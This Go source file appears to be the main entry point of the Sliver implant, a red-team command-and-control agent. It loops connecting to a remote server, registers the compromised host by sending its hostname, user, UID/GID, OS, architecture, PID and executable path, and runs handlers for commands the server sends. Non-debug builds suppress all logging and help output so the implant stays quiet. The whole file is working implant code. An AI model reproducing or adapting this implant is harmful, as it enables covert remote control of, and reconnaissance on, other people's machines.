package main

// {{if .IsSharedLib}}

import "C"

// {{end}}

import (
	"flag"
	"os"
	"os/user"
	"runtime"
	"time"

	// {{if .Debug}}{{else}}
	"io/ioutil"
	// {{end}}

	"log"

	pb "sliver/protobuf/sliver"
	consts "sliver/sliver/constants"
	"sliver/sliver/handlers"
	"sliver/sliver/limits"
	"sliver/sliver/transports"

	"github.com/golang/protobuf/proto"
)

// {{if .IsSharedLib}}

// RunSliver - Export for shared lib build
func RunSliver() {
	main()
}

// {{end}}

func main() {

	// {{if .Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	// {{else}}
	log.SetFlags(0)
	log.SetOutput(ioutil.Discard)
	// {{end}}

	flag.Usage = func() {} // No help!
	flag.Parse()

	// {{if .Debug}}
	log.Printf("Hello my name is %s", consts.SliverName)
	// {{end}}

	limits.ExecLimits() // Check to see if we should execute

	for {
		connection := transports.StartConnectionLoop()
		if connection == nil {
			break
		}
		mainLoop(connection)
		// {{if .Debug}}
		log.Printf("Lost connection, sleeping ...")
		// {{end}}
		time.Sleep(60 * time.Second) // TODO: Make configurable
	}
}

func mainLoop(connection *transports.Connection) {

	connection.Send <- getRegisterSliver() // Send registration information

	tunHandlers := handlers.GetTunnelHandlers()
	sysHandlers := handlers.GetSystemHandlers()

	for envelope := range connection.Recv {
		if handler, ok := sysHandlers[envelope.Type]; ok {
			// {{if .Debug}}
			log.Printf("[recv] sysHandler %d", envelope.Type)
			// {{end}}
			go handler(envelope.Data, func(data []byte, err error) {
				connection.Send <- &pb.Envelope{
					ID:   envelope.ID,
					Data: data,
				}
			})
		} else if handler, ok := tunHandlers[envelope.Type]; ok {
			// {{if .Debug}}
			log.Printf("[recv] tunHandler %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else {
			// {{if .Debug}}
			log.Printf("[recv] unknown envelope type %d", envelope.Type)
			// {{end}}
		}
	}
}

func getRegisterSliver() *pb.Envelope {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	filename, err := os.Executable()
	// Should not happen, but still...
	if err != nil {
		//TODO: build the absolute path to os.Args[0]
		filename = os.Args[0]
	}
	data, _ := proto.Marshal(&pb.Register{
		Name:     consts.SliverName,
		Hostname: hostname,
		Username: currentUser.Username,
		Uid:      currentUser.Uid,
		Gid:      currentUser.Gid,
		Os:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Pid:      int32(os.Getpid()),
		Filename: filename,
	})
	return &pb.Envelope{
		Type: pb.MsgRegister,
		Data: data,
	}
}
